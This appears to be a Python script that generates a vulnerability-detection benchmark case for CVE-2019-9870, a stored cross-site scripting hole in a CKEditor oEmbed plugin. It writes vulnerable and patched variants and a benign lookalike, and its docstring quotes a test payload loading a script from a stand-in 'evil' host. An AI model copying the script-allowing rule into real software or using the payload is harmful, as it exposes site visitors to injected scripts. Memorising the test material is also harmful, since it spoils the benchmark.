r"""
Section 9 ground-truth test bundle: CASE-0323
(w8tcha/CKEditor-oEmbed-Plugin, oembed/plugin.js plugin init,
CVE-2019-9870, CWE-79 stored cross-site scripting; recorded as CWE-19).

Core vulnerable mechanism: the oEmbed widget registers an Advanced Content
Filter allow-list (`allowedContent`) that includes
`'div(embeddedContent,oembed-provider-*) script': { attributes: '*' }`. The
CKEditor filter therefore KEEPS `<script>` elements (with any attributes,
including `src`) inside an embedded-content wrapper. A user who can edit or
paste content, or any HTML loaded into the editor, gets a persistent
`<script>` that runs for everyone who views the saved content (stored XSS),
defeating CKEditor's usual script stripping. The upstream fix deletes that
one rule (iframe, blockquote and embed stay allowed for real oEmbed
providers).

Sibling sites: the `iframe` and `blockquote` rules are the legitimate embed
carriers; only the `script` rule is removed.

Verification (REAL CKEditor): the full plugin file is evaluated in a
jsdom window with the REAL CKEditor 4.24 loaded, with `CKEDITOR.plugins.add`
replaced by a capture function; the plugin's `init` is called with a
permissive stand-in editor whose `widgets.add` captures the widget
definition. The captured `allowedContent` object is handed to the real
`CKEDITOR.filter` and applied to
`<div class="embeddedContent oembed-provider-x"><iframe src=..></iframe>
<script src=//evil/x.js></script><blockquote>..</blockquote></div>`.
Vulnerable variants keep the `<script>`; patched/safe drop it while keeping
the iframe and blockquote in every file.

Every variant is the FULL real file; the plugin registration (`init`) keeps
its name because CKEditor calls it.
"""
import re
from pathlib import Path

CASE_DIR = Path(__file__).resolve().parent.parent.parent / "benchmark" / "cases" / "CASE-0323"
original = (CASE_DIR / "vulnerable_source.js").read_text()
patched = (CASE_DIR / "patched_source.js").read_text()
assert "\r" not in original


def swap(text, old, new):
    assert text.count(old) == 1 and new != old, old
    return text.replace(old, new)


# --- Variant 1: renamed vulnerable variant (two local helpers of init renamed) ---
v1 = original
assert v1.count("loadjQueryLibaries") == 2 and v1.count("resizeTypeChanged") == 2
v1 = v1.replace("loadjQueryLibaries", "ensureJQuery").replace("resizeTypeChanged", "onResizeTypeChange")
(CASE_DIR / "variant_vulnerable_01.js").write_text(v1)


def hoist_allowed_content(text):
    key = "                            allowedContent: {\n"
    a = text.index(key)
    end_marker = "                            },\n                            template:"
    b = text.index(end_marker, a)
    literal = text[a + len(key):b]
    hoisted = "                    var embedRules = {\n" + literal + "                    };\n\n"
    text = text[:a] + "                            allowedContent: embedRules,\n" + text[b + len("                            },\n"):]
    widget = "                    editor.widgets.add('oembed',\n"
    assert text.count(widget) == 1
    return text.replace(widget, hoisted + widget)


# --- Variant 2: structurally changed vulnerable variant (allow-list hoisted into a local before widgets.add) ---
v2 = hoist_allowed_content(original)
assert "'div(embeddedContent,oembed-provider-*) script'" in v2 and "allowedContent: embedRules" in v2
(CASE_DIR / "variant_vulnerable_02.js").write_text(v2)

# --- Variant 3: transformed safe variant (real patched file; the same hoisting) ---
v3 = hoist_allowed_content(patched)
assert " script'" not in v3
(CASE_DIR / "variant_safe_01.js").write_text(v3)

(CASE_DIR / "benign_lookalike.js").write_text('''/**
 * Rich-text field configuration for a comments box. It mentions `script`
 * only in the DISALLOWED list, so script elements and inline event handlers
 * are stripped by CKEditor's content filter.
 */
module.exports = {
  allowedContent: {
    'p b i em strong ul ol li blockquote': true,
    a: { attributes: 'href,title' }
  },
  disallowedContent: 'script; *[on*]'
};
''')
